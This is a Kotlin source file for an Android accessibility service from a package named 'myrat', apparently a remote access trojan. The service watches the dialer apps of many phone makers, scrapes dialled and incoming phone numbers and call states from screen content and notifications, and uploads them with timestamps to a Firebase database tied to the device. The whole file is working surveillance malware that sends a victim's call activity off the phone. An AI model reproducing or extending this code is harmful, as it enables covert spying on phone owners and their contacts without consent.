package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.utils.Logger

class CallAccessibilityService : AccessibilityService() {

    private val db = Firebase.database.reference
    private lateinit var deviceId: String
    private val handler = Handler(Looper.getMainLooper())
    private var lastCallNumber: String? = null
    private var isInDialerApp = false

    companion object {
        // Common dialer app packages
        private val DIALER_PACKAGES = setOf(
            "com.android.dialer",
            "com.google.android.dialer",
            "com.samsung.android.dialer",
            "com.miui.dialer",
            "com.huawei.contacts",
            "com.oneplus.dialer",
            "com.oppo.dialer",
            "com.vivo.dialer",
            "com.realme.dialer"
        )

        // Call-related view IDs and text patterns
        private val CALL_NUMBER_IDS = listOf(
            "digits", "number", "phone_number", "call_number", "contact_name",
            "caller_name", "incoming_number", "outgoing_number"
        )

        private val CALL_STATE_TEXTS = listOf(
            "calling", "dialing", "ringing", "connected", "ended", "busy",
            "incoming call", "outgoing call", "call ended"
        )
    }

    override fun onCreate() {
        super.onCreate()
        try {
            deviceId = MainActivity.getDeviceId(this)
            setupAccessibilityService()
            Logger.log("CallAccessibilityService created for device: $deviceId")
        } catch (e: Exception) {
            Logger.error("Failed to create CallAccessibilityService", e)
        }
    }

    private fun setupAccessibilityService() {
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED

                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS

                packageNames = DIALER_PACKAGES.toTypedArray()
                notificationTimeout = 100
            }
            serviceInfo = info
            Logger.log("CallAccessibilityService configured for dialer monitoring")
        } catch (e: Exception) {
            Logger.error("Failed to setup CallAccessibilityService", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        try {
            val packageName = event.packageName?.toString() ?: return

            // Only process dialer app events
            if (!DIALER_PACKAGES.contains(packageName)) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleWindowStateChange(event, packageName)
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleContentChange(event, packageName)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    handleViewClick(event, packageName)
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    handleNotificationChange(event, packageName)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error processing accessibility event", e)
        }
    }

    private fun handleWindowStateChange(event: AccessibilityEvent, packageName: String) {
        try {
            val className = event.className?.toString() ?: return
            Logger.log("Window state changed in $packageName: $className")

            // Detect if we're in a call screen
            val isCallScreen = className.contains("call", ignoreCase = true) ||
                    className.contains("incall", ignoreCase = true) ||
                    className.contains("dialer", ignoreCase = true)

            if (isCallScreen) {
                isInDialerApp = true
                extractCallInformation(packageName)
            } else {
                isInDialerApp = false
            }
        } catch (e: Exception) {
            Logger.error("Error handling window state change", e)
        }
    }

    private fun handleContentChange(event: AccessibilityEvent, packageName: String) {
        try {
            if (!isInDialerApp) return

            val text = event.text?.joinToString(" ") ?: return
            if (text.isBlank()) return

            // Check for call state indicators
            val lowerText = text.lowercase()
            CALL_STATE_TEXTS.forEach { stateText ->
                if (lowerText.contains(stateText)) {
                    Logger.log("Call state detected: $stateText in $packageName")
                    reportCallState(stateText, packageName)
                    return
                }
            }

            // Check for phone numbers
            val phoneNumber = extractPhoneNumber(text)
            if (phoneNumber != null && phoneNumber != lastCallNumber) {
                lastCallNumber = phoneNumber
                Logger.log("Call number detected: $phoneNumber in $packageName")
                reportCallNumber(phoneNumber, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling content change", e)
        }
    }

    private fun handleViewClick(event: AccessibilityEvent, packageName: String) {
        try {
            val text = event.text?.joinToString(" ") ?: return
            Logger.log("View clicked in $packageName: $text")

            // Detect call button clicks
            val lowerText = text.lowercase()
            if (lowerText.contains("call") || lowerText.contains("dial")) {
                extractCallInformation(packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling view click", e)
        }
    }

    private fun handleNotificationChange(event: AccessibilityEvent, packageName: String) {
        try {
            val text = event.text?.joinToString(" ") ?: return
            Logger.log("Notification in $packageName: $text")

            // Extract call information from notifications
            val phoneNumber = extractPhoneNumber(text)
            if (phoneNumber != null) {
                reportCallNumber(phoneNumber, "notification_$packageName")
            }
        } catch (e: Exception) {
            Logger.error("Error handling notification change", e)
        }
    }

    private fun extractCallInformation(packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            // Look for call number in various UI elements
            val callNumber = findCallNumber(rootNode, packageName)
            if (callNumber != null && callNumber != lastCallNumber) {
                lastCallNumber = callNumber
                reportCallNumber(callNumber, packageName)
            }

            // Look for call state indicators
            val callState = findCallState(rootNode, packageName)
            if (callState != null) {
                reportCallState(callState, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error extracting call information", e)
        }
    }

    private fun findCallNumber(rootNode: AccessibilityNodeInfo, packageName: String): String? {
        try {
            // Try to find number by view IDs
            CALL_NUMBER_IDS.forEach { id ->
                val nodes = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
                nodes.forEach { node ->
                    val text = node.text?.toString()
                    val phoneNumber = extractPhoneNumber(text)
                    if (phoneNumber != null) {
                        return phoneNumber
                    }
                }
            }

            // Fallback: search all text nodes for phone numbers
            return searchNodeForPhoneNumber(rootNode)
        } catch (e: Exception) {
            Logger.error("Error finding call number", e)
            return null
        }
    }

    private fun searchNodeForPhoneNumber(node: AccessibilityNodeInfo): String? {
        try {
            // Check current node
            val text = node.text?.toString()
            val phoneNumber = extractPhoneNumber(text)
            if (phoneNumber != null) {
                return phoneNumber
            }

            // Check content description
            val contentDesc = node.contentDescription?.toString()
            val phoneNumberFromDesc = extractPhoneNumber(contentDesc)
            if (phoneNumberFromDesc != null) {
                return phoneNumberFromDesc
            }

            // Recursively check child nodes
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    val childResult = searchNodeForPhoneNumber(child)
                    if (childResult != null) {
                        return childResult
                    }
                }
            }

            return null
        } catch (e: Exception) {
            Logger.error("Error searching node for phone number", e)
            return null
        }
    }

    private fun findCallState(rootNode: AccessibilityNodeInfo, packageName: String): String? {
        try {
            return searchNodeForCallState(rootNode)
        } catch (e: Exception) {
            Logger.error("Error finding call state", e)
            return null
        }
    }

    private fun searchNodeForCallState(node: AccessibilityNodeInfo): String? {
        try {
            // Check current node
            val text = node.text?.toString()?.lowercase()
            if (text != null) {
                CALL_STATE_TEXTS.forEach { stateText ->
                    if (text.contains(stateText)) {
                        return stateText
                    }
                }
            }

            // Check content description
            val contentDesc = node.contentDescription?.toString()?.lowercase()
            if (contentDesc != null) {
                CALL_STATE_TEXTS.forEach { stateText ->
                    if (contentDesc.contains(stateText)) {
                        return stateText
                    }
                }
            }

            // Recursively check child nodes
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    val childResult = searchNodeForCallState(child)
                    if (childResult != null) {
                        return childResult
                    }
                }
            }

            return null
        } catch (e: Exception) {
            Logger.error("Error searching node for call state", e)
            return null
        }
    }

    private fun extractPhoneNumber(text: String?): String? {
        if (text.isNullOrBlank()) return null

        try {
            // Regex patterns for phone numbers
            val patterns = listOf(
                "\\+?[1-9]\\d{1,14}".toRegex(), // International format
                "\\(?\\d{3}\\)?[-\\s]?\\d{3}[-\\s]?\\d{4}".toRegex(), // US format
                "\\d{10,15}".toRegex() // Simple digit sequence
            )

            patterns.forEach { pattern ->
                val match = pattern.find(text)
                if (match != null) {
                    val number = match.value.replace(Regex("[^+\\d]"), "")
                    if (number.length >= 7) { // Minimum phone number length
                        return number
                    }
                }
            }

            return null
        } catch (e: Exception) {
            Logger.error("Error extracting phone number from: $text", e)
            return null
        }
    }

    private fun reportCallNumber(phoneNumber: String, source: String) {
        try {
            val callStatusRef = db.child("Device/$deviceId/call_status")
            callStatusRef.child("accessibility_detected_number").setValue(phoneNumber)
            callStatusRef.child("accessibility_source").setValue(source)
            callStatusRef.child("accessibility_timestamp").setValue(System.currentTimeMillis())

            Logger.log("Reported call number via accessibility: $phoneNumber from $source")
        } catch (e: Exception) {
            Logger.error("Error reporting call number", e)
        }
    }

    private fun reportCallState(state: String, source: String) {
        try {
            val callStatusRef = db.child("Device/$deviceId/call_status")
            callStatusRef.child("accessibility_detected_state").setValue(state)
            callStatusRef.child("accessibility_source").setValue(source)
            callStatusRef.child("accessibility_timestamp").setValue(System.currentTimeMillis())

            Logger.log("Reported call state via accessibility: $state from $source")
        } catch (e: Exception) {
            Logger.error("Error reporting call state", e)
        }
    }

    override fun onInterrupt() {
        Logger.log("CallAccessibilityService interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            isInDialerApp = false
            lastCallNumber = null
            Logger.log("CallAccessibilityService destroyed")
        } catch (e: Exception) {
            Logger.error("Error destroying CallAccessibilityService", e)
        }
    }
}